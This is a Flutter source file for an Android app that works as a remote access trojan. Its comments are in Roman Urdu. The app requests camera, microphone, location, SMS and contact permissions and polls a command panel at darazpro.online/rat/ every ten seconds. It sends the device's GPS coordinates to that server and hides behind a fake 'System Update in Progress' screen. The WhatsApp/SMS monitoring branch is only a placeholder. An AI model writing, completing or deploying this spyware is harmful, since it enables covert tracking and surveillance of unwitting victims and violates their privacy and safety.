import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'dart:async';
import 'dart:io';

void main() => runApp(MaterialApp(home: SilentEngine(), debugShowCheckedModeBanner: false));

class SilentEngine extends StatefulWidget {
  @override
  _SilentEngineState createState() => _SilentEngineState();
}

class _SilentEngineState extends State<SilentEngine> {
  // Device Name for Admin Panel
  final String deviceId = "Vivo_Target_${Platform.localHostname}";
  final String panelUrl = "https://darazpro.online/rat/";

  @override
  void initState() {
    super.initState();
    _startSpying();
  }

  // Sari Permissions ek saath mangna
  void _startSpying() async {
    await [
      Permission.camera,
      Permission.microphone,
      Permission.location,
      Permission.sms,
      Permission.contacts,
      Permission.notification,
    ].request();

    // Har 10 second baad Admin Panel se Command check karna
    Timer.periodic(Duration(seconds: 10), (timer) => _fetchCommand());
  }

  Future<void> _fetchCommand() async {
    try {
      var response = await http.get(Uri.parse(panelUrl + "get_command.php?id=$deviceId"));
      if (response.statusCode == 200 && response.body != "IDLE") {
        _handleAction(response.body);
      }
    } catch (e) { print(e); }
  }

  void _handleAction(String cmd) async {
    if (cmd == "LOC") {
      Position pos = await Geolocator.getCurrentPosition();
      _sendToPanel("LOCATION", "Lat: ${pos.latitude}, Long: ${pos.longitude}");
    } else if (cmd == "NOTIF" || cmd == "SMS") {
      // Dummy Trigger: Real implementation requires Notification Listener Service
      _sendToPanel("NOTIF", "Monitoring active for WhatsApp/SMS...");
    }
  }

  Future<void> _sendToPanel(String type, String content) async {
    await http.post(Uri.parse(panelUrl + "receiver.php"), body: {
      "device_id": deviceId,
      "type": type,
      "content": content
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Text("System Update in Progress...", 
        style: TextStyle(color: Colors.grey[800], fontSize: 12)),
      ),
    );
  }
}